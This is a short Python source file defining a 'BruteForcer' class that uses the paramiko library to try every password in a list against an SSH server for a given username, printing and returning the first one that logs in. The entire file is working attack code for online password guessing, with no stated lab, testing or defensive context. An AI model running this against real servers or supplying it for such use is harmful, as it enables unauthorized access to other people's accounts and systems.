import paramiko

class BruteForcer:
    def __init__(self, target, username, password_list):
        self.target = target
        self.username = username
        self.password_list = password_list

    def brute_force(self):
        for password in self.password_list:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(self.target, username=self.username, password=password)
                print(f"Password found: {password}")
                client.close()
                return password
            except paramiko.AuthenticationException:
                continue
        print("No valid password found.")
        return None